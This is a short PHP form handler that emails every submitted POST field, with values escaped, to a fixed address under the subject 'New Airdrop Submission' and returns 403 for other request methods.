<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $to = "airdrop-meme@zozoofficial.org";
    $subject = "New Airdrop Submission";

    $message = "";
    foreach ($_POST as $key => $value) {
        $message .= ucfirst($key) . ": " . htmlspecialchars($value) . "\n";
    }

    $headers = "From: no-reply@zozoofficial.org\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8";

    if (mail($to, $subject, $message, $headers)) {
        echo "Success";
    } else {
        echo "Mail send failed.";
    }
} else {
    http_response_code(403);
    echo "Invalid request.";
}
